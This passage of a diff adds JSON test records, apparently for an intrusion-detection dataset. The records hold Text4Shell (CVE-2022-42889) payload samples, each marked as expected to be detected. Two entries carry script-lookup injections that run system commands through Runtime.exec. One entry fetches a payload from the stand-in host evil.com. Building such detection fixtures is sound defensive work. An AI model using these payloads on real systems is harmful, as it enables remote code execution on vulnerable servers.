+    "payload": "${script:javascript:eval('java.lang.Runtime.getRuntime().exec(\"id\")')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "164.238.32.82",
+    "timestamp": "2026-03-13T21:53:09.061441"
+  },
+  {
+    "id": "text4shell_0098",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${script:javascript:Packages.java.lang.Runtime.getRuntime().exec('calc')}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "89.243.153.21",
+    "timestamp": "2026-03-13T21:53:09.061448"
+  },
+  {
+    "id": "text4shell_0099",
+    "type": "text4shell",
+    "cve": "CVE-2022-42889",
+    "payload": "${url:UTF-8:http://evil.com/payload}",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "144.32.125.173",
+    "timestamp": "2026-03-13T21:53:09.061453"
+  }
+]
